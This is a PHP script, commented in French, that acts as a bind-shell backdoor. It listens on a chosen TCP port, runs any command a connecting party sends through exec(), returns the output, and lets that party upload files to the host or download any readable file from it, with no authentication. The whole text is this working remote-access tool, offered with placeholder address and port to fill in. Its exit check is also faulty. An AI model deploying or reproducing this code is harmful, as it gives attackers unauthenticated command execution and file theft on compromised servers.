<?php


/* Attente du script en attendant une connxion*/
set_time_limit(0);

function uploadToClient($client,$filename){
    if (!is_readable($filename)) {
        
        socket_write($client,"NONREADABLE\n");
        return;
    }
    else
        socket_write($client,"READABLE\n");
    $myfile = fopen($filename, "r");
    socket_write($client,$filename."\n",strlen($filename ."\n"));
    $size =(string) filesize($filename);
    socket_write($client,$size."\n",strlen($size."\n"));
    while($data = fread($myfile,1024))
        socket_write($client,$data,strlen($data));
            }

function downloadFromClient($client){
    $filename = socket_read($client, 2048, PHP_NORMAL_READ);
    $myfile = fopen(substr($filename,0,-1), 'w');
    $size = (int) socket_read($client, 2048, PHP_NORMAL_READ);
    while ($size > 0)
    {
        echo "$size \n";
        $data = socket_read($client, 2048, PHP_BINARY_READ);
        $size = $size - strlen($data);
        echo "$size \n";
        fwrite($myfile,$data);
    }
    
}

function sendArray($client,$output){
    foreach ($output as $item) { 
            $item = $item . "\n"; 
            socket_write($client, $item, strlen($item)); //envoi la ligne au script py
        }
    

}



$procStatus = NULL;

$address = "IP-ADRESS"; //gethostname(); // ip de la machine
$port = CHOOSE_YOUR_PORT_TO_PEN;  // port ouvert

// creation socket avec AF_INET et TCP
if (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
	exit;
}

// COnfig socket pour forcer l'utilisation du port
if(socket_set_option($sock, SOL_SOCKET, SO_REUSEADDR, 1) == false){
    exit;
}

//Bind the socket to the certain IP and PORT
if (socket_bind($sock, $address, $port) === false) {
    exit;
}

//config socket pour etre le serveur (voir site web explicatif)
if (socket_listen($sock, 5) === false) {
    exit;
}

do {

    // attente de connexion
    if (($client = socket_accept($sock)) === false) {
        break;
    }

    
    do {

       //attente de commande
        if (false === ($buf = socket_read($client, 2048, PHP_NORMAL_READ))) {
            
            break;
        }

        $output = array();

	//si je recois exit en commande je quitte
                
        if (! $buf == "exit\n") 
            break;

        else if( substr($buf,0,6) == "upload")
        {
            downloadFromClient($client);
            continue;
        }
        else if(substr($buf,0,8) == "download")
        {
            $t = explode(" ",$buf);
            uploadToClient($client,substr($t[1],0,-1));
            continue;
        }
        
        if (substr($buf,0,2) == "cd") // si c'est CD alors je change de chemin
        {
            
            if(strlen($buf) > 4)
               chdir(substr($buf,3,-1)); // reviens un cran en arriere apres le CD
            else
                chdir(getenv("HOME"));  // SI juste CD alors go -->HOME
        }

        else
            // execute commande et enleve le \n
            // 2>&1 redirection des erreurs dans le reverse shell
            // to the client
            exec(substr($buf,0,-1) . " 2>&1", $output, $return_var);

        $numberoflines = (string) sizeof($output); // prend la taille de l'array pour
        
        $numberoflines  = $numberoflines . "\n";
        
        socket_write($client, $numberoflines, strlen($numberoflines)); // renvoi le nombre de ligne au client
        
        // loop???
        foreach ($output as $item) { 
            $item = $item . "\n"; 
            socket_write($client, $item, strlen($item));
        }
    
        } while (true);
    socket_close($client); // fin socket client
} while (true);

socket_close($sock); // fin socket server


?>
